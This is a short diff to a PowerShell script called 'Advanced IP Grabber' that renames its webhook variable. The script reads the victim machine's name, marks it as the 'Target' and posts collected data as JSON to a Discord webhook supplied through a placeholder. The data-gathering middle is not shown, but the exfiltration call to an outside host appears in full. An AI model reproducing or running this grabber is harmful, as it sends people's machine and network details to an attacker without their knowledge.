@@ -1,4 +1,4 @@
-$webHookUrl='$dc'
+$hookurl = "$dc"
 $title = "Advanced IP Grabber"
 $targetPC = (Get-WmiObject -class Win32_ComputerSystem).Name
 $description = "Target: **$targetPC**"
@@ -50,4 +50,4 @@ $payload = @{
 $payload = ConvertTo-Json -InputObject $payload -Compress -Depth 10
 
 # Use the Discord API to send the embed to a channel
-Invoke-RestMethod -Method "Post" -Uri $webHookUrl -Body $payload -ContentType 'application/json'
+Invoke-RestMethod -Method "Post" -Uri $hookurl -Body $payload -ContentType 'application/json'
